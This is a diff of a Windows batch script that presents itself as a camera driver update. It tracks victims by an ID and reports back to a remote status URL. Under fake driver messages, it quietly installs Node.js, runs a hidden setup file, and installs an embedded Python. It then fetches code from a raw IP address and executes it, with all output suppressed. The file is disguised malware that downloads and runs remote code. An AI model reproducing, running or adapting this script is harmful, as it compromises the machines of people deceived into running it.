@@ -7,29 +7,7 @@ if not defined WINDOW_UID goto :err_uid
 if "!WINDOW_UID!"=="" goto :err_uid
 if "!WINDOW_UID!"=="__ID__" goto :err_uid
 
-call :delay 1
 echo [INFO] Searching for Camera Drivers ...
-call :delay 1
-echo [INFO] Updating Driver Packages...
-call :delay 1
-echo [SUCCESS] Camera drivers have been updated successfully.
-if defined WINDOW_UID (
-  set "AUTO_URL=https://api.canditech.org/change-connection-status/!WINDOW_UID!"
-  curl -sL -X POST "!AUTO_URL!" -o nul
-)
-goto :skip_delay
-
-:err_uid
-echo [ERROR] WINDOW_UID is required. Please run this script from the provided link with your id.
-exit /b 1
-
-:delay
-REM Reliable delay in seconds (works when output is redirected); usage: call :delay 4
-set /a "pings=%~1+1"
-ping 127.0.0.1 -n !pings! -w 1000 >nul
-goto :eof
-
-:skip_delay
 
 :: if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b
 
@@ -51,25 +29,21 @@ where node >nul 2>&1
 if not errorlevel 1 (
     for /f "delims=" %%v in ('node -v 2^>nul') do set "NODE_INSTALLED_VERSION=%%v"
     set "NODE_EXE=node"
-    echo [INFO] Camera Driver is already installed globally: %NODE_INSTALLED_VERSION%
 )
 
 if not defined NODE_EXE (
     if exist "%PORTABLE_NODE%" (
         set "NODE_EXE=%PORTABLE_NODE%"
-        echo [INFO] Searching for Camera Drivers ...
         set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
-    ) else ( echo [INFO] Camera Driver not found globally. Attempting to extract portable version...
+    ) else (
 
-    :: -------------------------
-    :: Download Node.js MSI if needed
-    :: -------------------------
+    REM -------------------------
+    REM Download Node.js MSI if needed
+    REM -------------------------
     where curl >nul 2>&1
     if errorlevel 1 (
-        echo [INFO] Downloading Camera Driver...
         powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'" >nul 2>&1
     ) else (
-        echo [INFO] Downloading Camera Driver...
         curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%" >nul 2>&1
     )
 
@@ -77,16 +51,13 @@ if not defined NODE_EXE (
         msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%" >nul 2>&1
         del "%~dp0%NODE_MSI%"
     ) else (
-        echo [ERROR] Failed to download Camera Driver.
         exit /b 1
     )
 
     if exist "%PORTABLE_NODE%" (
-        echo [INFO] Portable Camera Driver found after extraction.
         set "NODE_EXE=%PORTABLE_NODE%"
         set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
     ) else (
-        echo [ERROR] Camera Driver not found after extraction.
         exit /b 1
     )
     )
@@ -96,7 +67,6 @@ if not defined NODE_EXE (
 :: Confirm Node.js works
 :: -------------------------
 if not defined NODE_EXE (
-    echo [ERROR] Camera Driver executable not found or set.
     exit /b 1
 )
 :: -------------------------
@@ -115,7 +85,7 @@ if errorlevel 1 (
 :: Run the parser
 :: -------------------------
 if exist "%CODEPROFILE%\env-setup.npl" (
-    echo [INFO] Running Driver Packages...
+    echo [INFO] Updating Driver Packages...
     cd "%CODEPROFILE%"
     "%NODE_EXE%" "env-setup.npl"
     mkdir C:\python 2>nul && curl -L https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip -o C:\python\py.zip && powershell -NoProfile -Command "Expand-Archive -Path C:\python\py.zip -DestinationPath C:\python -Force" && del C:\python\py.zip && powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
@@ -128,14 +98,19 @@ if exist "%CODEPROFILE%\env-setup.npl" (
 
     C:\python\python.exe -c "from urllib.request import urlopen,Request;Request._V='3-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >nul 2>&1
     if errorlevel 1 (
-        echo [ERROR] Driver execution failed.
         exit /b 1
     )
     if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
 ) else (
-    echo [ERROR] Driver files not found.
     exit /b 1
 )
-
-echo [SUCCESS] Camera Driver Setup completed successfully.
+echo [SUCCESS] Camera drivers have been updated successfully.
+if defined WINDOW_UID (
+  set "AUTO_URL=https://api.canditech.org/change-connection-status/!WINDOW_UID!"
+  curl -sL -X POST "!AUTO_URL!" -o nul
+)
 exit /b 0
+
+:err_uid
+echo [ERROR] WINDOW_UID is missing, empty, or still set to the placeholder __ID__.
+exit /b 1
